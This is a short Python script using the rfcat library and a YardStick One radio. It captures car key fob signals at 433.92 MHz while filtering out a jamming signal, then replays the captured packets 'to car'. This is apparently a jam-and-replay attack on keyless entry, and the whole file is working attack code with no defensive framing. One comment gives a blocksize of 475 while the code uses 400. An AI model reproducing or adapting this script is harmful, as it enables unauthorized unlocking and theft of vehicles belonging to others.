from rflib import *
from struct import *
import bitstring

d = RfCat(idx=0)
d.setMdmModulation(MOD_ASK_OOK) #on of key
d.setFreq(433920000) # frequency
d.setMdmDRate(4800)# how long each bit is transmited for
d.setMdmChanBW(60000)# how wide channel is
d.setMdmChanSpc(24000)
d.setChannel(0)
d.setMaxPower() # max power
d.lowball(1) # need inorder to read data

rawCapture = [] # array to store keyfob captures
i=0
while True:
	try:
		if i >=4: # number of packets to capture
			break;		
		y,t=d.RFrecv(timeout=1,blocksize=400) # blocksize is 475 to catch the whole packet 
		a=y.encode('hex') # turn to hex
		print a.count('f') 
		if  (a.count('f') < 350): # filter the jamming signal
			print str(a) # print key fob packet
			rawCapture.append(a) # add key fob to array
			i= i +1
	except ChipconUsbTimeoutException: # had to add this yard stick one kept timming out
		pass
for i in range(0,len(rawCapture)): # loop through each key fob capture
        raw_input("enter"+str(i+1))
        key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes() # get the length of the packet 
        d.makePktFLEN(len(key_packed)) # set packet length
        d.RFxmit(key_packed) # replay packet to car
d.setModeIDLE() # put yardstick one in idle mode
